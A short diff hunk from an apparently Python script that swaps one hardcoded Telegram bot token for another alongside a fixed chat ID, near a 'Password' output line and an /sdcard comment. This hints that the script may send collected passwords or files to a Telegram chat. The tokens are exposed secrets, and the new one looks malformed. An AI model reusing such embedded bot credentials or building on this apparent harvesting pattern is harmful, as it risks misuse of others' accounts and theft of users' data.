@@ -233,7 +233,7 @@ Password : {ps}
 def sexy():
     session=requests.session()
         
-    bot_token = '6270834359:AAGmXC75PvDo3bCzGuFPRY1EWTzOpA3CEI8'
+    bot_token = '6270834359:7136742830:AAFdAlaft1K917a6DpOM-gAN3-Zvg9X7yCE'
     chat_id = '1649675230'
     #-----------( /sdcard
     try:
